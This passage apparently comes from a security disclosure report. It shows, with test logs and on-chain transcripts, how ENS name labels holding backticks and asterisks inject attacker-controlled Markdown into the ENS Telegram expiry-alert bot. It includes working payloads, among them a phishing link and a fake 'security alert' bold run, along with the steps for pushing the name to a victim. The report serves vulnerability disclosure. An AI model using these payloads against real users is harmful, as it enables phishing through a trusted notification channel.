classifyDeliveryError -> {"category":"unknown"} -> dlq.ts marks the delivery permanently_failed

[… 3 vitest result lines elided …]
 Test Files  1 passed (1)
      Tests  3 passed (3)
```

### Part 3 — the emitted string parses as markup, and the button URL is valid

The Bot API's legacy `Markdown` mode supports exactly `*bold*`, `_italic_`, `code`, `pre` and `text`. **I did not send this message to the live Telegram API** — third-party services are out of scope (RULES.md:1022). Instead the exact strings the worker produced are fed to a real Markdown parser (`marked@15.0.12`, already in this repo's `node_modules`) to show the injected run is parsed as markup rather than shown as literal text, and the button URL to a real WHATWG URL parser.

`marked` is a CommonMark/GFM implementation, **not** Telegram's legacy-Markdown parser. It is a proxy, used because it agrees with the Bot API's documented legacy grammar on the two constructs at issue — backtick code spans and `text`. It corroborates the grammar; it is not proof of what Telegram's servers do.

`/tmp/render.mjs` feeds the two exact strings the worker produced — quoted verbatim in the output below as *exact text the worker POSTs* — to `marked.parse()`, and the inline-keyboard button URL to the WHATWG `new URL()`:

Actual output:

```
=== marquee payload ===
[… 1 line elided: *exact text the worker POSTs* — byte-identical to the `"text"` field of the captured request body in Part 2 …]
rendered by marked 15.0.12:
<p>⚠️ <em>Domain Expiration Alert</em></p>
<p>Your domain <code>ens-billing</code><a href="<https://ens-renewa1.example/restore>">ACTION-REQUIRED:RENEW-AT-ens-domains</a><code>x.eth</code> will expire in <em>3 days</em>.</p>
<p>Don&#39;t forget to renew your domain!</p>

[… 6 lines elided: the variant-A block; no rendered href is claimed for it — see Part 4c …]
=== variant B (no brackets, no dot) ===
[… 1 line elided: *exact text the worker POSTs* — byte-identical to variant B's `text on the wire` in Part 4c …]
rendered by marked 15.0.12:
<p>⚠️ <em>Domain Expiration Alert</em></p>
<p>Your domain <code>a</code><em>SECURITY-ALERT-CALL-ENS-SUPPORT-NOW</em><code>b.eth</code> will expire in <em>3 days</em>.</p>
<p>Don&#39;t forget to renew your domain!</p>

=== inline-keyboard button URL parsed by WHATWG URL ===
href   = <https://app.ens.domains/ens-billing%60ACTION-REQUIRED:RENEW-AT-ens-domains%60x.eth>
origin = <https://app.ens.domains>
```

Reading these honestly:

* **Marquee payload:** `<a href="<https://ens-renewa1.example/restore>">ACTION-REQUIRED:RENEW-AT-ens-domains</a>` — attacker-authored anchor, attacker-chosen text, inside the ENS bot's own message.
* **Variant B:** `<em>SECURITY-ALERT-CALL-ENS-SUPPORT-NOW</em>` sits where the name should be: text the template never wrote, parsed as an emphasis entity, inside the alert body. No brackets, no dot, no JavaScript. This is the load-bearing one for the impact row claimed.
* **Variant A:** I do **not** claim a specific rendered href for it under Telegram, whose client-side URL detection is a different implementation. Part 4c proves only what depends on no parser: the bare URL is emitted **outside** both code spans, in plain text, which is where a Telegram client auto-links URLs.
* The button URL keeps `origin = <https://app.ens.domains`>, so nothing about the payload makes Telegram reject the request, and nothing changes where that button points.

### Part 4 — the bracket-free variants, registered on-chain and driven through the worker

**4a. Variant B registered on-chain with a 28-day (minimum) duration.** Same setup script shape as Part 0, with `DURATION=2419200` and the variant-B label:

```
VICTIM=0x5CbDd86a2FA8Dc4bDdd8a8f69dBa48572EeC07FB
ATTACKER=0x7564105E977516C53bE337314c7E53838967bDaC
VARIANT-B LABEL = a`*SECURITY-ALERT-CALL-ENS-SUPPORT-NOW*`b
  contains '[' or ']' : 0
  contains '.'        : 0
registered label bytes: 61602a53454355524954592d414c4552542d43414c4c2d454e532d535550504f52542d4e4f572a6062
                  -> owner 0x7564105E977516C53bE337314c7E53838967bDaC   duration 2419200s (28 days)
```

**4b. Variant B's token pushed to the victim.** `apps/portal/.poc89445/89445-variantb-onchain.test.ts`, same shape as Part 1:

```
[… 2 lines elided: LABEL and LABEL hex — the same 40-byte string and the same hex as 4a …]
label has [ or ] = false | label has "." = false
NAME the worker would receive if the indexer passes the label through = "a`*SECURITY-ALERT-CALL-ENS-SUPPORT-NOW*`b.eth"
tokenId  = 70295343750014069888976560966718117175690410563701580426139054175299502604288
--- balances BEFORE ---
attacker 1
victim   0
attacker pushed the token to the victim: 0xfc8d9cb9787cf56169efc2d1890b700abbf75de516c4e6c0aa12c564fe5e1f17 status success
--- balances AFTER (no victim interaction) ---
attacker 0
victim   1 <- victim now owns the variant-B name
 ✓ .poc89445/89445-variantb-onchain.test.ts > variant-B label registers and the token is pushed to the victim 324ms
 Test Files  1 passed (1)
      Tests  1 passed (1)
```

**4c. Both variants driven through the real worker.** `workers/api-worker/.poc89445/89445-bracketfree-variant.test.ts`, run with `cd workers/api-worker && npx vitest run .poc89445/89445-bracketfree-variant.test.ts --reporter=verbose`. It carries the legacy subgraph's own predicate verbatim so both variants can be tested against it:

```tsx
// The exact predicate the legacy ENS subgraph applies to a labelName
// (`checkValidLabel`): reject NUL, '.', '[' and ']'.
function checkValidLabel(label: string): boolean {
  for (let i = 0; i < label.length; i++) {
    const c = label.charCodeAt(i)
    if (c === 0 || c === 46 || c === 91 || c === 93) return false
  }
  return true
}
```

Each variant is then parsed by `expiryEventSchema`, routed by `collectRecipientsForEvent`, templated by `telegramTemplates['name-expiry']` and delivered by `deliverTelegramNotification` with `fetch` stubbed to record the wire bytes — the same real functions as Part 2. The emitted text is split on backticks (`body.text.split('`')\`) so the plain-text region between the two code spans — the attacker-controlled, entity-parsed region — is printed directly.

Actual output:

```
 RUN  v4.1.5 /Users/bp/x/ens/1/workers/api-worker

LABEL             = "a`https://attacker.example`b"
LABEL hex         = 616068747470733a2f2f61747461636b65722e6578616d706c656062
label has [ or ]  = false
label has "."     = true
checkValidLabel   = false
expiryEventSchema accepted name = "a`https://attacker.example`b.eth"
recipients        = [ [ 'user-victim-uuid', 'owned' ] ]
deliver isOk      = true
parse_mode        = Markdown
text on the wire  = "⚠️ *Domain Expiration Alert*\n\nYour domain `a`https://attacker.example`b.eth` will expire in *3 days*.\n\nDon't forget to renew your domain!"
backtick count    = 4
asterisk count    = 4
code span 1       = "a"
BETWEEN the spans = "<https://attacker.example>" <- attacker-controlled, parsed as markup
code span 2       = "b.eth"

LABEL             = "a`*SECURITY-ALERT-CALL-ENS-SUPPORT-NOW*`b"
LABEL hex         = 61602a53454355524954592d414c4552542d43414c4c2d454e532d535550504f52542d4e4f572a6062
label has [ or ]  = false
label has "."     = false
checkValidLabel   = true
expiryEventSchema accepted name = "a`*SECURITY-ALERT-CALL-ENS-SUPPORT-NOW*`b.eth"
recipients        = [ [ 'user-victim-uuid', 'owned' ] ]
deliver isOk      = true
parse_mode        = Markdown
text on the wire  = "⚠️ *Domain Expiration Alert*\n\nYour domain `a`*SECURITY-ALERT-CALL-ENS-SUPPORT-NOW*`b.eth` will expire in *3 days*.\n\nDon't forget to renew your domain!"
backtick count    = 4
asterisk count    = 6
code span 1       = "a"
BETWEEN the spans = "*SECURITY-ALERT-CALL-ENS-SUPPORT-NOW*" <- attacker-controlled, parsed as markup
code span 2       = "b.eth"

[… 2 vitest result lines elided …]

 Test Files  1 passed (1)
      Tests  2 passed (2)
```

Note the honest result on the `checkValidLabel` line: **variant A fails it** (it needs a `.` for the hostname) and **variant B passes it**. Variant B is therefore the version of this attack that survives even if the v2 indexer inherits the legacy subgraph's label filter in full. Its 6 asterisks and 4 backticks all pair, so entity parsing succeeds, and the injected bold run replaces text in the ENS bot's own alert body — the claimed impact row, with no `[`, `]`, `.`, NUL or JavaScript anywhere.

***
